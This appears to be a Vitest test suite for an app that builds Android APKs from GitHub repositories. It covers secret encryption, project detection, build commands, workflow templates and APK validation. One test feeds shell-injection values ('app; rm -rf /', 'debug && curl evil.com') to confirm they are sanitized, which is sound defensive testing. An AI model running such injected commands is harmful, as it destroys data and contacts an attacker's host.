import AdmZip from 'adm-zip';
import sodium from 'libsodium-wrappers';
import { beforeAll, describe, expect, it } from 'vitest';
import { extractApkFromGitHubArtifactZip, validateApkBuffer } from '@/lib/android/apk-validator';
import { computeBuildCommand } from '@/lib/android/command-builder';
import { analyzeAndroidProject, discoverCandidateProjectDirectories } from '@/lib/android/detector';
import { classifyBuildFailure } from '@/lib/android/error-classifier';
import { mapGitHubStepNameToStageIndex } from '@/lib/builds/stages';
import { parseGitHubLogsToEntries } from '@/lib/builds/sync-engine';
import { getRepo2ApkWorkflowYaml } from '@/lib/builds/workflow-template';
import { SUPABASE_CHUNK_BYTES } from '@/lib/db/supabase';
import { buildGitHubAppManifest, formatVercelGitHubAppEnv } from '@/lib/github/manifest';
import YAML from 'yaml';
import {
  decryptSecret,
  encryptSecret,
  sealGitHubActionSecret,
  signSessionToken,
  verifyGitHubWebhookSignature,
  verifySessionToken,
} from '@/lib/crypto';
import crypto from 'node:crypto';

beforeAll(() => {
  process.env.TOKEN_ENCRYPTION_KEY = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
  process.env.SESSION_SECRET = 'super-secure-test-session-secret-key-32-plus-chars';
});

describe('Crypto & Security Primitives', () => {
  it('encrypts and decrypts secrets with AES-256-GCM and rejects tampered payloads', () => {
    const plain = 'ghu_realOAuthSecretTokenValue12345';
    const encrypted = encryptSecret(plain);
    expect(encrypted).not.toContain(plain);
    expect(encrypted.startsWith('v1:')).toBe(true);
    expect(decryptSecret(encrypted)).toBe(plain);

    const parts = encrypted.split(':');
    parts[3] = parts[3].slice(0, -2) + 'AA';
    expect(() => decryptSecret(parts.join(':'))).toThrow();
  });

  it('signs and verifies HMAC HttpOnly session tokens', () => {
    const token = signSessionToken({ userId: 'user-uuid-1', githubLogin: 'kirlous0' }, 3600);
    const verified = verifySessionToken(token);
    expect(verified?.userId).toBe('user-uuid-1');
    expect(verified?.githubLogin).toBe('kirlous0');

    expect(verifySessionToken(token + 'tampered')).toBeNull();
  });

  it('verifies GitHub webhook HMAC-SHA256 signatures accurately', () => {
    const body = JSON.stringify({ action: 'completed', workflow_run: { id: 42 } });
    const secret = 'webhook_test_secret_987';
    const sig = `sha256=${crypto.createHmac('sha256', secret).update(body).digest('hex')}`;
    expect(verifyGitHubWebhookSignature(body, sig, secret)).toBe(true);
    expect(verifyGitHubWebhookSignature(body, 'sha256=deadbeef', secret)).toBe(false);
    expect(verifyGitHubWebhookSignature(body, null, secret)).toBe(false);
  });

  it('seals GitHub Actions repository secrets using LibSodium crypto_box_seal', async () => {
    await sodium.ready;
    const kp = sodium.crypto_box_keypair();
    const pubB64 = sodium.to_base64(kp.publicKey, sodium.base64_variants.ORIGINAL);
    const sealedB64 = await sealGitHubActionSecret(pubB64, 'my-release-password');
    const sealedBytes = sodium.from_base64(sealedB64, sodium.base64_variants.ORIGINAL);
    const opened = sodium.crypto_box_seal_open(sealedBytes, kp.publicKey, kp.privateKey);
    expect(sodium.to_string(opened)).toBe('my-release-password');
  });
});

describe('Android Project Detection Engine', () => {
  it('detects Native Android Kotlin DSL multi-module projects with flavors and signing', async () => {
    const files: Record<string, string> = {
      'settings.gradle.kts': 'include(":app", ":core:network")',
      'build.gradle.kts': 'plugins { alias(libs.plugins.android.application) apply false }',
      'gradle/libs.versions.toml':
        '[versions]\nagp = "8.5.1"\nkotlin = "2.0.0"\n[plugins]\nandroid-application = { id = "com.android.application", version.ref = "agp" }',
      'gradle/wrapper/gradle-wrapper.properties':
        'distributionUrl=https\\://services.gradle.org/distributions/gradle-8.7-bin.zip',
      'app/build.gradle.kts': `
        plugins { alias(libs.plugins.android.application) }
        android {
          namespace = "com.example.wallet"
          compileSdk = 35
          defaultConfig {
            applicationId = "com.example.wallet"
            minSdk = 24
            targetSdk = 35
            versionCode = 14
            versionName = "2.1.0"
          }
          signingConfigs {
            create("release") {
              storeFile = file(System.getenv("KEYSTORE_PATH") ?: "release.jks")
            }
          }
          buildTypes {
            getByName("release") { isMinifyEnabled = true }
          }
          productFlavors {
            create("free") {}
            create("pro") {}
          }
        }
        dependencies {
          implementation("androidx.core:core-ktx:1.13.1")
        }
      `,
      'core/network/build.gradle.kts': 'plugins { id("com.android.library") }',
    };

    const tree = [...Object.keys(files), 'gradlew', 'app/src/main/java/MainActivity.kt'];
    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/wallet-android',
      branch: 'main',
      commitSha: '1234567890abcdef',
      projectDir: '.',
      treePaths: tree,
      fetchFile: async (p) => files[p] ?? null,
    });

    expect(analysis.isAndroidProject).toBe(true);
    expect(analysis.isBuildable).toBe(true);
    expect(analysis.framework).toBe('native_android');
    expect(analysis.language).toBe('Kotlin');
    expect(analysis.agpVersion).toBe('8.5.1');
    expect(analysis.gradleWrapperVersion).toBe('8.7');
    expect(analysis.packageId).toBe('com.example.wallet');
    expect(analysis.androidSdk.compileSdk).toBe('35');
    expect(analysis.androidSdk.minSdk).toBe('24');
    expect(analysis.applicationModules).toEqual(['app']);
    expect(analysis.availableVariants).toContain('proRelease');
    expect(analysis.existingSigning.hasReleaseSigningConfig).toBe(true);
  });

  it('detects Flutter Android projects and computes Flutter build commands', async () => {
    const files: Record<string, string> = {
      'pubspec.yaml': `
name: shop_mobile
version: 1.4.2+19
environment:
  sdk: ">=3.4.0 <4.0.0"
dependencies:
  flutter:
    sdk: flutter
  http: ^1.2.1
`,
      '.fvmrc': '{"flutter": "3.24.3"}',
      'android/app/build.gradle': `
android {
  compileSdkVersion 34
  defaultConfig {
    applicationId "com.shop.mobile"
    minSdkVersion 23
    targetSdkVersion 34
  }
}
`,
      'android/gradle/wrapper/gradle-wrapper.properties':
        'distributionUrl=https\\://services.gradle.org/distributions/gradle-8.3-all.zip',
    };

    const tree = [...Object.keys(files), 'android/gradlew', 'lib/main.dart'];
    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/shop-flutter',
      branch: 'main',
      commitSha: 'abcdef1234567890',
      projectDir: '.',
      treePaths: tree,
      fetchFile: async (p) => files[p] ?? null,
    });

    expect(analysis.isAndroidProject).toBe(true);
    expect(analysis.isBuildable).toBe(true);
    expect(analysis.framework).toBe('flutter');
    expect(analysis.flutterVersion).toBe('3.24.3');
    expect(analysis.versionName).toBe('1.4.2');
    expect(analysis.versionCode).toBe('19');
    expect(analysis.packageId).toBe('com.shop.mobile');

    const cmd = computeBuildCommand({
      analysis,
      buildType: 'release',
      abiMode: 'split',
      buildName: '1.5.0',
      buildNumber: '20',
    });
    expect(cmd.command).toBe(
      'flutter build apk --release --split-per-abi --build-name=1.5.0 --build-number=20'
    );
  });

  it('rejects Expo managed projects lacking native android/ directory (no WebView wrappers)', async () => {
    const files: Record<string, string> = {
      'package.json': JSON.stringify({
        name: 'expo-managed',
        dependencies: { expo: '^51.0.0', react: '18.2.0' },
      }),
    };
    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/expo-managed',
      branch: 'main',
      commitSha: 'aaaa1111bbbb2222',
      projectDir: '.',
      treePaths: ['package.json', 'App.tsx'],
      fetchFile: async (p) => files[p] ?? null,
    });

    expect(analysis.isAndroidProject).toBe(false);
    expect(analysis.isBuildable).toBe(false);
    expect(analysis.framework).toBe('unsupported');
  });

  it('rejects non-Android web repositories and discovers monorepo subdirectories', async () => {
    const tree = [
      'apps/web/package.json',
      'apps/mobile/pubspec.yaml',
      'apps/mobile/android/app/build.gradle',
      'apps/mobile/android/gradlew',
    ];
    const dirs = discoverCandidateProjectDirectories(tree);
    expect(dirs).toContain('apps/mobile');

    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/monorepo',
      branch: 'main',
      commitSha: 'deadbeef1234',
      projectDir: 'apps/web',
      treePaths: tree,
      fetchFile: async (p) =>
        p === 'apps/web/package.json'
          ? JSON.stringify({ name: 'web', dependencies: { next: '16.0.0' } })
          : null,
    });

    expect(analysis.isAndroidProject).toBe(false);
    expect(analysis.isBuildable).toBe(false);
  });

  it('sanitizes build command inputs against shell injection', () => {
    const cmd = computeBuildCommand({
      analysis: {
        framework: 'native_android',
        selectedModule: 'app',
      } as never,
      buildType: 'debug',
      applicationModule: 'app; rm -rf /',
      buildVariant: 'debug && curl evil.com',
    });
    expect(cmd.command).toBe('./gradlew :app:assembleDebug --no-daemon');
  });

  it('detects pure Java Android projects (with gradle.properties and optional missing gradlew)', async () => {
    const files: Record<string, string> = {
      'settings.gradle': "include ':app'",
      'gradle.properties': 'compileSdkVersion=34\nminSdkVersion=24\ntargetSdkVersion=34',
      'app/build.gradle': `
        apply plugin: 'com.android.application'
        android {
          namespace "com.acme.javaapp"
          compileSdkVersion project.properties.compileSdkVersion.toInteger()
          defaultConfig {
            applicationId "com.acme.javaapp"
            minSdkVersion project.properties.minSdkVersion.toInteger()
            targetSdkVersion project.properties.targetSdkVersion.toInteger()
          }
        }
      `,
      'app/src/main/AndroidManifest.xml': '<manifest package="com.acme.javaapp"/>',
    };

    const analysis = await analyzeAndroidProject({
      repoFullName: 'acme/java-android',
      branch: 'main',
      commitSha: '1111222233334444',
      projectDir: '.',
      treePaths: [...Object.keys(files), 'app/src/main/java/com/acme/MainActivity.java'],
      fetchFile: async (p) => files[p] ?? null,
    });

    expect(analysis.isAndroidProject).toBe(true);
    expect(analysis.isBuildable).toBe(true);
    expect(analysis.framework).toBe('native_android');
    expect(analysis.language).toBe('Java');
    expect(analysis.packageId).toBe('com.acme.javaapp');
    expect(analysis.androidSdk.compileSdk).toBe('34');
    expect(analysis.androidSdk.minSdk).toBe('24');
    expect(analysis.hasGradleWrapper).toBe(false);
    expect(analysis.warnings.some((w) => w.code === 'MISSING_GRADLE_WRAPPER')).toBe(true);

    const cmd = computeBuildCommand({ analysis, buildType: 'debug' });
    expect(cmd.command).toBe('gradle :app:assembleDebug --no-daemon');
  });

  it('classifies README-only repos and standard Java non-Android repos accurately', async () => {
    const readmeOnly = await analyzeAndroidProject({
      repoFullName: 'kirlous0/Ultra',
      branch: 'main',
      commitSha: '6249e392',
      projectDir: '.',
      treePaths: ['README.md'],
      fetchFile: async () => '# Ultra',
    });
    expect(readmeOnly.isBuildable).toBe(false);
    expect(readmeOnly.nonAndroidReason?.code).toBe('EMPTY_OR_README_ONLY_REPOSITORY');

    const javaServer = await analyzeAndroidProject({
      repoFullName: 'acme/java-cli',
      branch: 'main',
      commitSha: '55556666',
      projectDir: '.',
      treePaths: ['pom.xml', 'src/main/java/App.java'],
      fetchFile: async () => '<project/>',
    });
    expect(javaServer.isBuildable).toBe(false);
    expect(javaServer.nonAndroidReason?.code).toBe('JAVA_NON_ANDROID_PROJECT');
  });

  it('analyzes AGP 9.1 / Gradle 9.3.1 projects without gradlew cleanly (UltraCam profile)', async () => {
    const files: Record<string, string> = {
      'settings.gradle.kts': 'include(":app")',
      'build.gradle.kts': 'plugins { alias(libs.plugins.android.application) apply false }',
      'gradle/libs.versions.toml':
        '[versions]\nagp = "9.1.1"\nkotlin = "2.4.21"\n[plugins]\nandroid-application = { id = "com.android.application", version.ref = "agp" }',
      'gradle/wrapper/gradle-wrapper.properties':
        'distributionUrl=https\\://services.gradle.org/distributions/gradle-9.3.1-bin.zip',
      'app/build.gradle.kts': `
        android {
          namespace = "com.example"
          compileSdk { version = release(36) { minorApiLevel = 1 } }
          defaultConfig {
            applicationId = "com.aistudio.ultracam.k7m9qx"
            minSdk = 24
            targetSdk = 36
          }
          compileOptions {
            sourceCompatibility = JavaVersion.VERSION_11
            targetCompatibility = JavaVersion.VERSION_11
          }
        }
      `,
    };
    const analysis = await analyzeAndroidProject({
      repoFullName: 'kirlous0/Ultra',
      branch: 'main',
      commitSha: 'd32c9b16',
      projectDir: '.',
      treePaths: [...Object.keys(files), 'app/src/main/java/com/example/MainActivity.kt'],
      fetchFile: async (p) => files[p] ?? null,
    });

    expect(analysis.isBuildable).toBe(true);
    expect(analysis.agpVersion).toBe('9.1.1');
    expect(analysis.gradleWrapperVersion).toBe('9.3.1');
    expect(analysis.hasGradleWrapper).toBe(false);
    expect(analysis.recommendedJdk).toBe('21');
    expect(analysis.androidSdk.compileSdk).toBe('36');
  });
});

describe('Hardened Workflow Template & Failure Classifier', () => {
  it('generates valid workflow YAML without legacy setup-android@v3 or obsolete tools package', () => {
    const yml = getRepo2ApkWorkflowYaml();
    const parsed = YAML.parse(yml) as {
      on?: { workflow_dispatch?: { inputs?: Record<string, unknown> } };
      jobs?: { build_apk?: { steps?: Array<{ name?: string; uses?: string; run?: string }> } };
    };
    expect(parsed.on?.workflow_dispatch?.inputs?.compile_sdk).toBeDefined();
    const steps = parsed.jobs?.build_apk?.steps || [];
    expect(steps.some((s) => s.uses?.includes('android-actions/setup-android@v3'))).toBe(false);
    const sdkStep = steps.find((s) => s.name === '[Stage 3] Setup Android SDK');
    expect(sdkStep?.run).toContain('sdkmanager');
    expect(sdkStep?.run).toContain('platform-tools');
    expect(sdkStep?.run).toContain('if [[ ! -x "$SDKMANAGER" ]]');
    expect(sdkStep?.run).toContain('find -L');
    expect(sdkStep?.run).toContain('chmod -R u+rwX');
    expect(sdkStep?.run).not.toContain('"tools"');
    const cfgStep = steps.find((s) => s.name === '[Stage 5] Android project configuration');
    expect(cfgStep?.run).toContain('distributionUrl');
    expect(cfgStep?.run).toContain('debug.keystore');
    expect(cfgStep?.run).toContain('KEYSTORE_PATH');

    expect(mapGitHubStepNameToStageIndex('[Stage 3] Setup Android SDK')).toBe(3);
    expect(mapGitHubStepNameToStageIndex('Cleanup ephemeral signing workspace')).toBe(-1);
    expect(mapGitHubStepNameToStageIndex('Post actions/checkout@v4')).toBe(-1);
    expect(mapGitHubStepNameToStageIndex('Run set -euo pipefail', 3)).toBe(3);
  });

  it('extracts real sdkmanager failure instead of GitHub Actions metadata headers', () => {
    const log = [
      '2026-11-23T18:57:39Z with:',
      '2026-11-23T18:57:39Z   accept-android-sdk-licenses: true',
      '2026-11-23T18:57:39Z   packages: tools platform-tools',
      '2026-11-23T18:57:44Z Error: The process \'/usr/local/lib/android/sdk/cmdline-tools/16.0/bin/sdkmanager\' failed with exit code 1',
    ].join('\n');

    const diag = classifyBuildFailure({ logText: log });
    expect(diag.code).toBe('ANDROID_SDK_CONFIG_ERROR');
    expect(diag.matchedLogExcerpt).toContain('sdkmanager');
    expect(diag.matchedLogExcerpt).not.toContain('accept-android-sdk-licenses: true');

    expect(
      classifyBuildFailure({
        logText:
          "chmod: changing permissions of '/usr/local/lib/android/sdk/cmdline-tools/latest/bin/sdkmanager': Operation not permitted",
      }).code
    ).toBe('ANDROID_SDK_CONFIG_ERROR');

    expect(
      classifyBuildFailure({ logText: 'File google-services.json is missing.' }).code
    ).toBe('GOOGLE_SERVICES_MISSING');
    expect(
      classifyBuildFailure({ logText: 'java.lang.OutOfMemoryError: Java heap space' }).code
    ).toBe('GRADLE_OUT_OF_MEMORY');
    expect(
      classifyBuildFailure({ logText: 'Manifest merger failed : uses-sdk:minSdkVersion 21' }).code
    ).toBe('MANIFEST_MERGER_ERROR');
  });
});

describe('APK Validation & Error Classification', () => {
  it('validates real APK archive structure and rejects fake APKs', () => {
    const validZip = new AdmZip();
    validZip.addFile('AndroidManifest.xml', crypto.randomBytes(2048));
    validZip.addFile('classes.dex', crypto.randomBytes(4096));
    validZip.addFile('resources.arsc', crypto.randomBytes(1024));
    const apkBuf = validZip.toBuffer();

    const okResult = validateApkBuffer(apkBuf, 'app-debug.apk', null, true);
    expect(okResult.isValidApk).toBe(true);
    expect(okResult.signingStatus).toBe('debug_signed');
    expect(okResult.sha256).toHaveLength(64);

    // Fake APK (plain text renamed .apk)
    const fakeResult = validateApkBuffer(Buffer.from('not-an-apk'), 'fake.apk');
    expect(fakeResult.isValidApk).toBe(false);
    expect(fakeResult.validationErrors.length).toBeGreaterThan(0);

    // Extract from GitHub Actions artifact zip while skipping androidTest
    const ghZip = new AdmZip();
    ghZip.addFile('app-debug-androidTest.apk', apkBuf);
    ghZip.addFile('app-release.apk', apkBuf);
    ghZip.addFile(
      'repo2apk-metadata.json',
      Buffer.from(JSON.stringify({ packageId: 'com.acme.test', sha256: okResult.sha256 }))
    );
    const extracted = extractApkFromGitHubArtifactZip(ghZip.toBuffer());
    expect(extracted?.apkFileName).toBe('app-release.apk');
    expect(extracted?.metadata?.packageId).toBe('com.acme.test');
  });

  it('classifies real Gradle/Java/SDK/Flutter/Signing errors accurately', () => {
    expect(
      classifyBuildFailure({
        logText: 'Unsupported class file major version 65. Android Gradle plugin requires Java 17',
      }).code
    ).toBe('INCOMPATIBLE_JAVA_VERSION');

    expect(
      classifyBuildFailure({
        logText: 'Failed to install the following Android SDK packages as some licences have not been accepted.',
      }).code
    ).toBe('ANDROID_SDK_CONFIG_ERROR');

    expect(
      classifyBuildFailure({
        logText: 'Could not resolve all files for configuration :app:debugRuntimeClasspath.',
      }).code
    ).toBe('DEPENDENCY_RESOLUTION_ERROR');

    expect(
      classifyBuildFailure({
        logText: 'Target kernel_snapshot_program failed: Exception',
        framework: 'flutter',
      }).code
    ).toBe('FLUTTER_COMPILATION_ERROR');
  });

  it('builds GitHub App manifest and formats Vercel Import .env output safely', () => {
    const manifest = buildGitHubAppManifest('https://repo2apk.vercel.app', 'Repo2APK Test');
    expect(manifest.redirect_url).toBe('https://repo2apk.vercel.app/api/github/manifest/callback');
    expect(manifest.callback_urls).toEqual(['https://repo2apk.vercel.app/api/auth/github/callback']);
    expect(manifest.default_permissions).toEqual({
      actions: 'write',
      contents: 'write',
      metadata: 'read',
      secrets: 'write',
      workflows: 'write',
    });

    const envText = formatVercelGitHubAppEnv({
      id: 12345,
      slug: 'repo2apk-test',
      client_id: 'Iv1.abc123',
      client_secret: 'secret_xyz',
      pem: '-----BEGIN RSA PRIVATE KEY-----\nLINE1\nLINE2\n-----END RSA PRIVATE KEY-----\n',
      webhook_secret: 'whsec_789',
    });
    expect(envText).toContain('GITHUB_APP_ID=12345\n');
    expect(envText).toContain('GITHUB_APP_SLUG=repo2apk-test\n');
    expect(envText).toContain(
      'GITHUB_APP_PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----\\nLINE1\\nLINE2\\n-----END RSA PRIVATE KEY-----"\n'
    );
    expect(envText).toContain('GITHUB_WEBHOOK_SECRET=whsec_789\n');
  });

  it('attributes Stage 7 upload-artifact logs cleanly and enforces < 50 MB chunk limit', () => {
    expect(mapGitHubStepNameToStageIndex('actions/upload-artifact@v4', 6)).toBe(7);
    expect(SUPABASE_CHUNK_BYTES).toBe(15 * 1024 * 1024);
    expect(SUPABASE_CHUNK_BYTES).toBeLessThan(50 * 1024 * 1024);

    const sampleLog = [
      '2026-11-23T19:26:00Z ##[group]Run [Stage 6] Compile APK',
      '2026-11-23T19:29:59Z BUILD SUCCESSFUL in 3m 2s',
      '2026-11-23T19:30:01Z ##[group]Run [Stage 7] Validate APK & Generate Metadata',
      '2026-11-23T19:30:01Z Validated APK: app-debug.apk (SHA-256: abcdef)',
      '2026-11-23T19:30:02Z ##[group]Run actions/upload-artifact@v4',
      '2026-11-23T19:30:08Z Artifact repo2apk-565001efe33c72282629.zip uploaded!',
    ].join('\n');

    const parsed = parseGitHubLogsToEntries(sampleLog);
    expect(parsed.some((e) => e.stage_index === 6 && e.content.includes('BUILD SUCCESSFUL'))).toBe(true);
    expect(parsed.some((e) => e.stage_index === 7 && e.content.includes('Validated APK'))).toBe(true);
    expect(parsed.some((e) => e.stage_index === 7 && e.content.includes('upload-artifact@v4'))).toBe(true);
  });
});
